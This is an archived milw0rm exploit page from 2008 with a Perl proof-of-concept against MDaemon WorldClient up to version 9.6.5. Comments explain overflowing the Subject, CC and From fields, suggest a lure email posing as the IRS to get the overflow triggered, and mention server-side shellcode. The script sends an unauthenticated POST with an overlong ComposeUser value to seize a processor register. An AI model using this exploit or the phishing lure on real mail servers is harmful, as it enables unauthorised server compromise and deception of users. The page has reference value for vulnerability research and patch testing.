<html><head><title>MDaemon <= 9.6.5 Multiple Remote Buffer Overflow Exploit PoC</title></head><pre>############################################################################
# MDaemon &lt;== v9.6.5 Multiple Remote Buffer Overflow
#
# Vendor Site: http://altn.com
#
# Risk : Highly Critical
# hehe funny bugs here .. the worldclient use the port 3000 for a webmail like (it use also an admin webmail 
# located at 
# port 1000 [by default both are opened])
# this file unfortunatly contain multiple buffer overflows , If you send a message to a user ( or postmaster ? :] )
# with a subject composed of 8194 A ( like : &quot; Do your incomming taxes online this year, it's safe and fast,just reply with 
# the supplied incomming form...8100 A &quot; from incomming@irs.gov etc )
# if the user click &quot;answer&quot; to the message , eip get owned
# the CC &amp; From field is vulnerable too .
#
# This kind of bug is pretty nasty, because the client doesn't get owned , but postmaster yes. so if you have an account 
# on a host providing MDaemon services ,
# you can send a mail to yourself and get some shellcode executed on the server.
# if you dont ... just have a look on google,you'll find out
#
#
# this poc is another bug, actually it shouldn't work, because we dont have any cookie &amp; session ,but it give a full control 
# over EDX without any auth, dont ask why, it's like this only for this variable [ComposeUser] =)
#
# Greetz to : French/Quebec security community &amp; http://spiritofhack.net .
# ungreetz to : they'll reconize them =)
#
# Ps: actually this audit is NOT finished ... there might be some other remote bugs/advisory , i just dont have time for 
# this at the moment, i recommend to the ones who want to do it , to look at Webclient.exe &amp; Webadmin.exe , there's 
# some funny stuff in there hehe .

use LWP::UserAgent;
$connect = LWP::UserAgent-&gt;new;
my $payload1 =&quot;a&quot; x 60;
my $payload2 =&quot;b&quot; x 20;
my $host = 'http://127.0.0.1:3000/';

my $req = HTTP::Request-&gt;new(POST =&gt; $host.'WorldClient.dll?Session=&amp;View=Compose&amp;ComposeInNewWindow=Yes&amp;ChangeView=No&amp;SendNow=Yes');
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;content('ComposeUser='.$payload2.$payload1.'%40localhost&amp;&amp;ComposeID=1&amp;Attn=&amp;Company=&amp;From=0&amp;Reply-To=&amp;To=%22admin+bla%22+%3Cadmin%40localhost%3E%2C+&amp;CC=YO&amp;BCC=&amp;Subject=hey&amp;Body=yo%21&amp;');
my $res = $connect-&gt;request($req);
print $res-&gt;as_string;

# &quot;If in time like these you can talk about individual freedom, you're probably a terrorist&quot;

# milw0rm.com [2008-06-02]</pre></html>